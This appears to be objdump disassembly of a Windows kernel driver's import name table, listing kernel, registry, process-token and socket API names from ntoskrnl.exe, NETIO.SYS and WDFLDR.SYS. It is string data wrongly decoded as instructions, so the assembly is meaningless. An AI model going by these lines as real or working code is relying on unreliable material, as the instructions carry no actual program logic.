   140016800:	6c                   	insb   (%dx),(%rdi)
   140016801:	6c                   	insb   (%dx),(%rdi)
   140016802:	62 61 63 6b 00       	(bad)
   140016807:	00 54 00 43          	add    %dl,0x43(%rax,%rax,1)
   14001680b:	6d                   	insl   (%dx),(%rdi)
   14001680c:	52                   	push   %rdx
   14001680d:	65 67 69 73 74 65 72 	imul   $0x61437265,%gs:0x74(%ebx),%esi
   140016814:	43 61 
   140016816:	6c                   	insb   (%dx),(%rdi)
   140016817:	6c                   	insb   (%dx),(%rdi)
   140016818:	62 61 63 6b 45       	(bad)
   14001681d:	78 00                	js     0x14001681f
   14001681f:	00 4d 00             	add    %cl,0x0(%rbp)
   140016822:	43 6d                	rex.XB insl (%dx),(%rdi)
   140016824:	43 61                	rex.XB (bad)
   140016826:	6c                   	insb   (%dx),(%rdi)
   140016827:	6c                   	insb   (%dx),(%rdi)
   140016828:	62 61 63 6b 47       	(bad)
   14001682d:	65 74 4b             	gs je  0x14001687b
   140016830:	65 79 4f             	gs jns 0x140016882
   140016833:	62 6a 65 63 74       	(bad)
   140016838:	49                   	rex.WB
   140016839:	44 00 00             	add    %r8b,(%rax)
   14001683c:	89 05 4d 6d 49 73    	mov    %eax,0x73496d4d(%rip)        # 0x1b34ad58f
   140016842:	41                   	rex.B
   140016843:	64 64 72 65          	fs fs jb 0x1400168ac
   140016847:	73 73                	jae    0x1400168bc
   140016849:	56                   	push   %rsi
   14001684a:	61                   	(bad)
   14001684b:	6c                   	insb   (%dx),(%rdi)
   14001684c:	69 64 00 00 c5 0b 73 	imul   $0x74730bc5,0x0(%rax,%rax,1),%esp
   140016853:	74 
   140016854:	72 6c                	jb     0x1400168c2
   140016856:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140016858:	00 00                	add    %al,(%rax)
   14001685a:	c8 0b 73 74          	enter  $0x730b,$0x74
   14001685e:	72 6e                	jb     0x1400168ce
   140016860:	63 6d 70             	movsxd 0x70(%rbp),%ebp
   140016863:	00 c9                	add    %cl,%cl
   140016865:	0b 73 74             	or     0x74(%rbx),%esi
   140016868:	72 6e                	jb     0x1400168d8
   14001686a:	63 70 79             	movsxd 0x79(%rax),%esi
   14001686d:	00 dc                	add    %bl,%ah
   14001686f:	0b 77 63             	or     0x63(%rdi),%esi
   140016872:	73 63                	jae    0x1400168d7
   140016874:	61                   	(bad)
   140016875:	74 00                	je     0x140016877
   140016877:	00 e3                	add    %ah,%bl
   140016879:	0b 77 63             	or     0x63(%rdi),%esi
   14001687c:	73 6c                	jae    0x1400168ea
   14001687e:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140016880:	00 00                	add    %al,(%rax)
   140016882:	e6 0b                	out    %al,$0xb
   140016884:	77 63                	ja     0x1400168e9
   140016886:	73 6e                	jae    0x1400168f6
   140016888:	63 6d 70             	movsxd 0x70(%rbp),%ebp
   14001688b:	00 76 08             	add    %dh,0x8(%rsi)
   14001688e:	52                   	push   %rdx
   14001688f:	74 6c                	je     0x1400168fd
   140016891:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140016893:	69 74 41 6e 73 69 53 	imul   $0x74536973,0x6e(%rcx,%rax,2),%esi
   14001689a:	74 
   14001689b:	72 69                	jb     0x140016906
   14001689d:	6e                   	outsb  (%rsi),(%dx)
   14001689e:	67 00 bf 0b 73 74 72 	add    %bh,0x7274730b(%edi)
   1400168a5:	63 61 74             	movsxd 0x74(%rcx),%esp
   1400168a8:	00 00                	add    %al,(%rax)
   1400168aa:	c2 0b 73             	ret    $0x730b
   1400168ad:	74 72                	je     0x140016921
   1400168af:	63 6d 70             	movsxd 0x70(%rbp),%ebp
   1400168b2:	00 00                	add    %al,(%rax)
   1400168b4:	c6                   	(bad)
   1400168b5:	0b 73 74             	or     0x74(%rbx),%esi
   1400168b8:	72 6e                	jb     0x140016928
   1400168ba:	63 61 74             	movsxd 0x74(%rcx),%esp
   1400168bd:	00 ce                	add    %cl,%dh
   1400168bf:	0b 73 74             	or     0x74(%rbx),%esi
   1400168c2:	72 73                	jb     0x140016937
   1400168c4:	74 72                	je     0x140016938
   1400168c6:	00 00                	add    %al,(%rax)
   1400168c8:	96                   	xchg   %eax,%esi
   1400168c9:	00 45 78             	add    %al,0x78(%rbp)
   1400168cc:	41 63 71 75          	movsxd 0x75(%r9),%esi
   1400168d0:	69 72 65 53 70 69 6e 	imul   $0x6e697053,0x65(%rdx),%esi
   1400168d7:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   1400168d9:	63 6b 45             	movsxd 0x45(%rbx),%ebp
   1400168dc:	78 63                	js     0x140016941
   1400168de:	6c                   	insb   (%dx),(%rdi)
   1400168df:	75 73                	jne    0x140016954
   1400168e1:	69 76 65 00 00 20 01 	imul   $0x1200000,0x65(%rsi),%esi
   1400168e8:	45 78 52             	rex.RB js 0x14001693d
   1400168eb:	65 6c                	gs insb (%dx),(%rdi)
   1400168ed:	65 61                	gs (bad)
   1400168ef:	73 65                	jae    0x140016956
   1400168f1:	53                   	push   %rbx
   1400168f2:	70 69                	jo     0x14001695d
   1400168f4:	6e                   	outsb  (%rsi),(%dx)
   1400168f5:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   1400168f7:	63 6b 45             	movsxd 0x45(%rbx),%ebp
   1400168fa:	78 63                	js     0x14001695f
   1400168fc:	6c                   	insb   (%dx),(%rdi)
   1400168fd:	75 73                	jne    0x140016972
   1400168ff:	69 76 65 00 00 e0 0b 	imul   $0xbe00000,0x65(%rsi),%esi
   140016906:	77 63                	ja     0x14001696b
   140016908:	73 63                	jae    0x14001696d
   14001690a:	70 79                	jo     0x140016985
   14001690c:	00 00                	add    %al,(%rax)
   14001690e:	a4                   	movsb  (%rsi),(%rdi)
   14001690f:	07                   	(bad)
   140016910:	52                   	push   %rdx
   140016911:	74 6c                	je     0x14001697f
   140016913:	41 6e                	rex.B outsb (%rsi),(%dx)
   140016915:	73 69                	jae    0x140016980
   140016917:	53                   	push   %rbx
   140016918:	74 72                	je     0x14001698c
   14001691a:	69 6e 67 54 6f 55 6e 	imul   $0x6e556f54,0x67(%rsi),%ebp
   140016921:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   140016928:	72 69                	jb     0x140016993
   14001692a:	6e                   	outsb  (%rsi),(%dx)
   14001692b:	67 00 00             	add    %al,(%eax)
   14001692e:	43 08 52 74          	rex.XB or %dl,0x74(%r10)
   140016932:	6c                   	insb   (%dx),(%rdi)
   140016933:	46 72 65             	rex.RX jb 0x14001699b
   140016936:	65 55                	gs push %rbp
   140016938:	6e                   	outsb  (%rsi),(%dx)
   140016939:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   140016940:	72 69                	jb     0x1400169ab
   140016942:	6e                   	outsb  (%rsi),(%dx)
   140016943:	67 00 00             	add    %al,(%eax)
   140016946:	e6 07                	out    %al,$0x7
   140016948:	52                   	push   %rdx
   140016949:	74 6c                	je     0x1400169b7
   14001694b:	43 72 65             	rex.XB jb 0x1400169b3
   14001694e:	61                   	(bad)
   14001694f:	74 65                	je     0x1400169b6
   140016951:	53                   	push   %rbx
   140016952:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140016956:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%rcx,%rdi,2),%esi
   14001695d:	72 
   14001695e:	69 70 74 6f 72 00 2e 	imul   $0x2e00726f,0x74(%rax),%esi
   140016965:	09 52 74             	or     %edx,0x74(%rdx)
   140016968:	6c                   	insb   (%dx),(%rdi)
   140016969:	53                   	push   %rbx
   14001696a:	65 74 44             	gs je  0x1400169b1
   14001696d:	61                   	(bad)
   14001696e:	63 6c 53 65          	movsxd 0x65(%rbx,%rdx,2),%ebp
   140016972:	63 75 72             	movsxd 0x72(%rbp),%esi
   140016975:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%rcx,%rdi,2),%esi
   14001697c:	72 
   14001697d:	69 70 74 6f 72 00 00 	imul   $0x726f,0x74(%rax),%esi
   140016984:	f6 04 4b 65          	testb  $0x65,(%rbx,%rcx,2)
   140016988:	52                   	push   %rdx
   140016989:	65 73 65             	gs jae 0x1400169f1
   14001698c:	74 45                	je     0x1400169d3
   14001698e:	76 65                	jbe    0x1400169f5
   140016990:	6e                   	outsb  (%rsi),(%dx)
   140016991:	74 00                	je     0x140016993
   140016993:	00 8f 04 4b 65 49    	add    %cl,0x49654b04(%rdi)
   140016999:	6e                   	outsb  (%rsi),(%dx)
   14001699a:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   1400169a1:	65 
   1400169a2:	54                   	push   %rsp
   1400169a3:	69 6d 65 72 45 78 00 	imul   $0x784572,0x65(%rbp),%ebp
   1400169aa:	17                   	(bad)
   1400169ab:	05 4b 65 53 65       	add    $0x6553654b,%eax
   1400169b0:	74 54                	je     0x140016a06
   1400169b2:	69 6d 65 72 45 78 00 	imul   $0x784572,0x65(%rbp),%ebp
   1400169b9:	00 e0                	add    %ah,%al
   1400169bb:	06                   	(bad)
   1400169bc:	50                   	push   %rax
   1400169bd:	73 43                	jae    0x140016a02
   1400169bf:	72 65                	jb     0x140016a26
   1400169c1:	61                   	(bad)
   1400169c2:	74 65                	je     0x140016a29
   1400169c4:	53                   	push   %rbx
   1400169c5:	79 73                	jns    0x140016a3a
   1400169c7:	74 65                	je     0x140016a2e
   1400169c9:	6d                   	insl   (%dx),(%rdi)
   1400169ca:	54                   	push   %rsp
   1400169cb:	68 72 65 61 64       	push   $0x64616572
   1400169d0:	00 00                	add    %al,(%rax)
   1400169d2:	98                   	cwtl
   1400169d3:	0a 5a 77             	or     0x77(%rdx),%bl
   1400169d6:	43 72 65             	rex.XB jb 0x140016a3e
   1400169d9:	61                   	(bad)
   1400169da:	74 65                	je     0x140016a41
   1400169dc:	4b                   	rex.WXB
   1400169dd:	65 79 00             	gs jns 0x1400169e0
   1400169e0:	d9 0a                	(bad) (%rdx)
   1400169e2:	5a                   	pop    %rdx
   1400169e3:	77 4f                	ja     0x140016a34
   1400169e5:	70 65                	jo     0x140016a4c
   1400169e7:	6e                   	outsb  (%rsi),(%dx)
   1400169e8:	4b                   	rex.WXB
   1400169e9:	65 79 00             	gs jns 0x1400169ec
   1400169ec:	b9 0a 5a 77 46       	mov    $0x46775a0a,%ecx
   1400169f1:	6c                   	insb   (%dx),(%rdi)
   1400169f2:	75 73                	jne    0x140016a67
   1400169f4:	68 4b 65 79 00       	push   $0x79654b
   1400169f9:	00 17                	add    %dl,(%rdi)
   1400169fb:	0b 5a 77             	or     0x77(%rdx),%ebx
   1400169fe:	51                   	push   %rcx
   1400169ff:	75 65                	jne    0x140016a66
   140016a01:	72 79                	jb     0x140016a7c
   140016a03:	56                   	push   %rsi
   140016a04:	61                   	(bad)
   140016a05:	6c                   	insb   (%dx),(%rdi)
   140016a06:	75 65                	jne    0x140016a6d
   140016a08:	4b                   	rex.WXB
   140016a09:	65 79 00             	gs jns 0x140016a0c
   140016a0c:	4f 0b 5a 77          	rex.WRXB or 0x77(%r10),%r11
   140016a10:	53                   	push   %rbx
   140016a11:	65 74 56             	gs je  0x140016a6a
   140016a14:	61                   	(bad)
   140016a15:	6c                   	insb   (%dx),(%rdi)
   140016a16:	75 65                	jne    0x140016a7d
   140016a18:	4b                   	rex.WXB
   140016a19:	65 79 00             	gs jns 0x140016a1c
   140016a1c:	1b 06                	sbb    (%rsi),%eax
   140016a1e:	4e 74 51             	rex.WRX je 0x140016a72
   140016a21:	75 65                	jne    0x140016a88
   140016a23:	72 79                	jb     0x140016a9e
   140016a25:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140016a27:	66 6f                	outsw  (%rsi),(%dx)
   140016a29:	72 6d                	jb     0x140016a98
   140016a2b:	61                   	(bad)
   140016a2c:	74 69                	je     0x140016a97
   140016a2e:	6f                   	outsl  (%rsi),(%dx)
   140016a2f:	6e                   	outsb  (%rsi),(%dx)
   140016a30:	54                   	push   %rsp
   140016a31:	6f                   	outsl  (%rsi),(%dx)
   140016a32:	6b 65 6e 00          	imul   $0x0,0x6e(%rbp),%esp
   140016a36:	c8 08 52 74          	enter  $0x5208,$0x74
   140016a3a:	6c                   	insb   (%dx),(%rdi)
   140016a3b:	4c                   	rex.WR
   140016a3c:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140016a3e:	67 74 68             	addr32 je 0x140016aa9
   140016a41:	53                   	push   %rbx
   140016a42:	69 64 00 00 d1 07 52 	imul   $0x745207d1,0x0(%rax,%rax,1),%esp
   140016a49:	74 
   140016a4a:	6c                   	insb   (%dx),(%rdi)
   140016a4b:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140016a4d:	6e                   	outsb  (%rsi),(%dx)
   140016a4e:	76 65                	jbe    0x140016ab5
   140016a50:	72 74                	jb     0x140016ac6
   140016a52:	53                   	push   %rbx
   140016a53:	69 64 54 6f 55 6e 69 	imul   $0x63696e55,0x6f(%rsp,%rdx,2),%esp
   140016a5a:	63 
   140016a5b:	6f                   	outsl  (%rsi),(%dx)
   140016a5c:	64 65 53             	fs gs push %rbx
   140016a5f:	74 72                	je     0x140016ad3
   140016a61:	69 6e 67 00 00 df 07 	imul   $0x7df0000,0x67(%rsi),%ebp
   140016a68:	52                   	push   %rdx
   140016a69:	74 6c                	je     0x140016ad7
   140016a6b:	43 72 65             	rex.XB jb 0x140016ad3
   140016a6e:	61                   	(bad)
   140016a6f:	74 65                	je     0x140016ad6
   140016a71:	41 63 6c 00 00       	movsxd 0x0(%r8,%rax,1),%ebp
   140016a76:	93                   	xchg   %eax,%ebx
   140016a77:	07                   	(bad)
   140016a78:	52                   	push   %rdx
   140016a79:	74 6c                	je     0x140016ae7
   140016a7b:	41                   	rex.B
   140016a7c:	64 64 41 63 63 65    	fs movsxd %fs:0x65(%r11),%esp
   140016a82:	73 73                	jae    0x140016af7
   140016a84:	41 6c                	rex.B insb (%dx),(%rdi)
   140016a86:	6c                   	insb   (%dx),(%rdi)
   140016a87:	6f                   	outsl  (%rsi),(%dx)
   140016a88:	77 65                	ja     0x140016aef
   140016a8a:	64 41 63 65 00       	movsxd %fs:0x0(%r13),%esp
   140016a8f:	00 31                	add    %dh,(%rcx)
   140016a91:	09 52 74             	or     %edx,0x74(%rdx)
   140016a94:	6c                   	insb   (%dx),(%rdi)
   140016a95:	53                   	push   %rbx
   140016a96:	65 74 4f             	gs je  0x140016ae8
   140016a99:	77 6e                	ja     0x140016b09
   140016a9b:	65 72 53             	gs jb  0x140016af1
   140016a9e:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140016aa2:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%rcx,%rdi,2),%esi
   140016aa9:	72 
   140016aaa:	69 70 74 6f 72 00 4f 	imul   $0x4f00726f,0x74(%rax),%esi
   140016ab1:	07                   	(bad)
   140016ab2:	50                   	push   %rax
   140016ab3:	73 4c                	jae    0x140016b01
   140016ab5:	6f                   	outsl  (%rsi),(%dx)
   140016ab6:	6f                   	outsl  (%rsi),(%dx)
   140016ab7:	6b 75 70 50          	imul   $0x50,0x70(%rbp),%esi
   140016abb:	72 6f                	jb     0x140016b2c
   140016abd:	63 65 73             	movsxd 0x73(%rbp),%esp
   140016ac0:	73 42                	jae    0x140016b04
   140016ac2:	79 50                	jns    0x140016b14
   140016ac4:	72 6f                	jb     0x140016b35
   140016ac6:	63 65 73             	movsxd 0x73(%rbp),%esp
   140016ac9:	73 49                	jae    0x140016b14
   140016acb:	64 00 00             	add    %al,%fs:(%rax)
   140016ace:	5e                   	pop    %rsi
   140016acf:	06                   	(bad)
   140016ad0:	4f 62 4f 70 65 6e    	(bad)
   140016ad6:	4f 62 6a 65 63 74    	(bad)
   140016adc:	42 79 50             	rex.X jns 0x140016b2f
   140016adf:	6f                   	outsl  (%rsi),(%dx)
   140016ae0:	69 6e 74 65 72 00 e0 	imul   $0xe0007265,0x74(%rsi),%ebp
   140016ae7:	0a 5a 77             	or     0x77(%rdx),%bl
   140016aea:	4f 70 65             	rex.WRXB jo 0x140016b52
   140016aed:	6e                   	outsb  (%rsi),(%dx)
   140016aee:	50                   	push   %rax
   140016aef:	72 6f                	jb     0x140016b60
   140016af1:	63 65 73             	movsxd 0x73(%rbp),%esp
   140016af4:	73 54                	jae    0x140016b4a
   140016af6:	6f                   	outsl  (%rsi),(%dx)
   140016af7:	6b 65 6e 45          	imul   $0x45,0x6e(%rbp),%esp
   140016afb:	78 00                	js     0x140016afd
   140016afd:	00 48 0b             	add    %cl,0xb(%rax)
   140016b00:	5a                   	pop    %rdx
   140016b01:	77 53                	ja     0x140016b56
   140016b03:	65 74 53             	gs je  0x140016b59
   140016b06:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140016b0a:	69 74 79 4f 62 6a 65 	imul   $0x63656a62,0x4f(%rcx,%rdi,2),%esi
   140016b11:	63 
   140016b12:	74 00                	je     0x140016b14
   140016b14:	11 07                	adc    %eax,(%rdi)
   140016b16:	50                   	push   %rax
   140016b17:	73 47                	jae    0x140016b60
   140016b19:	65 74 50             	gs je  0x140016b6c
   140016b1c:	72 6f                	jb     0x140016b8d
   140016b1e:	63 65 73             	movsxd 0x73(%rbp),%esp
   140016b21:	73 49                	jae    0x140016b6c
   140016b23:	6d                   	insl   (%dx),(%rdi)
   140016b24:	61                   	(bad)
   140016b25:	67 65 46 69 6c 65 4e 	imul   $0x656d61,%gs:0x4e(%ebp,%r12d,2),%r13d
   140016b2c:	61 6d 65 00 
   140016b30:	54                   	push   %rsp
   140016b31:	07                   	(bad)
   140016b32:	50                   	push   %rax
   140016b33:	73 50                	jae    0x140016b85
   140016b35:	72 6f                	jb     0x140016ba6
   140016b37:	63 65 73             	movsxd 0x73(%rbp),%esp
   140016b3a:	73 54                	jae    0x140016b90
   140016b3c:	79 70                	jns    0x140016bae
   140016b3e:	65 00 b8 09 53 65 45 	add    %bh,%gs:0x45655309(%rax)
   140016b45:	78 70                	js     0x140016bb7
   140016b47:	6f                   	outsl  (%rsi),(%dx)
   140016b48:	72 74                	jb     0x140016bbe
   140016b4a:	73 00                	jae    0x140016b4c
   140016b4c:	c1 0b 73             	rorl   $0x73,(%rbx)
   140016b4f:	74 72                	je     0x140016bc3
   140016b51:	63 68 72             	movsxd 0x72(%rax),%ebp
   140016b54:	00 00                	add    %al,(%rax)
   140016b56:	ca 0b 73             	lret   $0x730b
   140016b59:	74 72                	je     0x140016bcd
   140016b5b:	6e                   	outsb  (%rsi),(%dx)
   140016b5c:	63 70 79             	movsxd 0x79(%rax),%esi
   140016b5f:	5f                   	pop    %rdi
   140016b60:	73 00                	jae    0x140016b62
   140016b62:	ae                   	scas   (%rdi),%al
   140016b63:	05 4d 6d 50 72       	add    $0x72506d4d,%eax
   140016b68:	6f                   	outsl  (%rsi),(%dx)
   140016b69:	62 65 41 6e 64       	(bad)
   140016b6e:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   140016b70:	63 6b 50             	movsxd 0x50(%rbx),%ebp
   140016b73:	61                   	(bad)
   140016b74:	67 65 73 00          	addr32 gs jae 0x140016b78
   140016b78:	c5 05 4d             	(bad)
   140016b7b:	6d                   	insl   (%dx),(%rdi)
   140016b7c:	55                   	push   %rbp
   140016b7d:	6e                   	outsb  (%rsi),(%dx)
   140016b7e:	6c                   	insb   (%dx),(%rdi)
   140016b7f:	6f                   	outsl  (%rsi),(%dx)
   140016b80:	63 6b 50             	movsxd 0x50(%rbx),%ebp
   140016b83:	61                   	(bad)
   140016b84:	67 65 73 00          	addr32 gs jae 0x140016b88
   140016b88:	c4 02 49 6f          	(bad)
   140016b8c:	41 6c                	rex.B insb (%dx),(%rdi)
   140016b8e:	6c                   	insb   (%dx),(%rdi)
   140016b8f:	6f                   	outsl  (%rsi),(%dx)
   140016b90:	63 61 74             	movsxd 0x74(%rcx),%esp
   140016b93:	65 4d                	gs rex.WRB
   140016b95:	64 6c                	fs insb (%dx),(%rdi)
   140016b97:	00 1d 03 49 6f 46    	add    %bl,0x466f4903(%rip)        # 0x18670b4a0
   140016b9d:	72 65                	jb     0x140016c04
   140016b9f:	65 4d                	gs rex.WRB
   140016ba1:	64 6c                	fs insb (%dx),(%rdi)
   140016ba3:	00 ad 03 49 6f 52    	add    %ch,0x526f4903(%rbp)
   140016ba9:	65 75 73             	gs jne 0x140016c1f
   140016bac:	65 49 72 70          	gs rex.WB jb 0x140016c20
   140016bb0:	00 00                	add    %al,(%rax)
   140016bb2:	65 0b 5f 5f          	or     %gs:0x5f(%rdi),%ebx
   140016bb6:	43 5f                	rex.XB pop %r15
   140016bb8:	73 70                	jae    0x140016c2a
   140016bba:	65 63 69 66          	movsxd %gs:0x66(%rcx),%ebp
   140016bbe:	69 63 5f 68 61 6e 64 	imul   $0x646e6168,0x5f(%rbx),%esp
   140016bc5:	6c                   	insb   (%dx),(%rdi)
   140016bc6:	65 72 00             	gs jb  0x140016bc9
   140016bc9:	00 6e 74             	add    %ch,0x74(%rsi)
   140016bcc:	6f                   	outsl  (%rsi),(%dx)
   140016bcd:	73 6b                	jae    0x140016c3a
   140016bcf:	72 6e                	jb     0x140016c3f
   140016bd1:	6c                   	insb   (%dx),(%rdi)
   140016bd2:	2e 65 78 65          	cs js,pn 0x140016c3b
   140016bd6:	00 00                	add    %al,(%rax)
   140016bd8:	27                   	(bad)
   140016bd9:	02 57 73             	add    0x73(%rdi),%dl
   140016bdc:	6b 52 65 67          	imul   $0x67,0x65(%rdx),%edx
   140016be0:	69 73 74 65 72 00 24 	imul   $0x24007265,0x74(%rbx),%esi
   140016be7:	02 57 73             	add    0x73(%rdi),%dl
   140016bea:	6b 43 61 70          	imul   $0x70,0x61(%rbx),%eax
   140016bee:	74 75                	je     0x140016c65
   140016bf0:	72 65                	jb     0x140016c57
   140016bf2:	50                   	push   %rax
   140016bf3:	72 6f                	jb     0x140016c64
   140016bf5:	76 69                	jbe    0x140016c60
   140016bf7:	64 65 72 4e          	fs gs jb 0x140016c49
   140016bfb:	50                   	push   %rax
   140016bfc:	49 00 28             	rex.WB add %bpl,(%r8)
   140016bff:	02 57 73             	add    0x73(%rdi),%dl
   140016c02:	6b 52 65 6c          	imul   $0x6c,0x65(%rdx),%edx
   140016c06:	65 61                	gs (bad)
   140016c08:	73 65                	jae    0x140016c6f
   140016c0a:	50                   	push   %rax
   140016c0b:	72 6f                	jb     0x140016c7c
   140016c0d:	76 69                	jbe    0x140016c78
   140016c0f:	64 65 72 4e          	fs gs jb 0x140016c61
   140016c13:	50                   	push   %rax
   140016c14:	49 00 25 02 57 73 6b 	rex.WB add %spl,0x6b735702(%rip)        # 0x1ab74c31d
   140016c1b:	44                   	rex.R
   140016c1c:	65 72 65             	gs jb  0x140016c84
   140016c1f:	67 69 73 74 65 72 00 	imul   $0x4e007265,0x74(%ebx),%esi
   140016c26:	4e 
   140016c27:	45 54                	rex.RB push %r12
   140016c29:	49                   	rex.WB
   140016c2a:	4f                   	rex.WRXB
   140016c2b:	2e 53                	cs push %rbx
   140016c2d:	59                   	pop    %rcx
   140016c2e:	53                   	push   %rbx
   140016c2f:	00 40 04             	add    %al,0x4(%rax)
   140016c32:	4b                   	rex.WXB
   140016c33:	65 42 75 67          	gs rex.X jne 0x140016c9e
   140016c37:	43 68 65 63 6b 45    	rex.XB push $0x456b6365
   140016c3d:	78 00                	js     0x140016c3f
   140016c3f:	00 dc                	add    %bl,%ah
   140016c41:	07                   	(bad)
   140016c42:	52                   	push   %rdx
   140016c43:	74 6c                	je     0x140016cb1
   140016c45:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140016c47:	70 79                	jo     0x140016cc2
   140016c49:	55                   	push   %rbp
   140016c4a:	6e                   	outsb  (%rsi),(%dx)
   140016c4b:	69 63 6f 64 65 53 74 	imul   $0x74536564,0x6f(%rbx),%esp
   140016c52:	72 69                	jb     0x140016cbd
   140016c54:	6e                   	outsb  (%rsi),(%dx)
   140016c55:	67 00 00             	add    %al,(%eax)
   140016c58:	08 00                	or     %al,(%rax)
   140016c5a:	57                   	push   %rdi
   140016c5b:	64 66 56             	fs push %si
   140016c5e:	65 72 73             	gs jb  0x140016cd4
   140016c61:	69 6f 6e 55 6e 62 69 	imul   $0x69626e55,0x6e(%rdi),%ebp
   140016c68:	6e                   	outsb  (%rsi),(%dx)
   140016c69:	64 00 00             	add    %al,%fs:(%rax)
   140016c6c:	06                   	(bad)
   140016c6d:	00 57 64             	add    %dl,0x64(%rdi)
   140016c70:	66 56                	push   %si
   140016c72:	65 72 73             	gs jb  0x140016ce8
   140016c75:	69 6f 6e 42 69 6e 64 	imul   $0x646e6942,0x6e(%rdi),%ebp
   140016c7c:	00 00                	add    %al,(%rax)
   140016c7e:	07                   	(bad)
   140016c7f:	00 57 64             	add    %dl,0x64(%rdi)
   140016c82:	66 56                	push   %si
   140016c84:	65 72 73             	gs jb  0x140016cfa
   140016c87:	69 6f 6e 42 69 6e 64 	imul   $0x646e6942,0x6e(%rdi),%ebp
   140016c8e:	43 6c                	rex.XB insb (%dx),(%rdi)
   140016c90:	61                   	(bad)
   140016c91:	73 73                	jae    0x140016d06
   140016c93:	00 09                	add    %cl,(%rcx)
   140016c95:	00 57 64             	add    %dl,0x64(%rdi)
   140016c98:	66 56                	push   %si
   140016c9a:	65 72 73             	gs jb  0x140016d10
   140016c9d:	69 6f 6e 55 6e 62 69 	imul   $0x69626e55,0x6e(%rdi),%ebp
   140016ca4:	6e                   	outsb  (%rsi),(%dx)
   140016ca5:	64 43 6c             	fs rex.XB insb (%dx),(%rdi)
   140016ca8:	61                   	(bad)
   140016ca9:	73 73                	jae    0x140016d1e
   140016cab:	00 57 44             	add    %dl,0x44(%rdi)
   140016cae:	46                   	rex.RX
   140016caf:	4c                   	rex.WR
   140016cb0:	44 52                	rex.R push %rdx
   140016cb2:	2e 53                	cs push %rbx
   140016cb4:	59                   	pop    %rcx
   140016cb5:	53                   	push   %rbx
	...
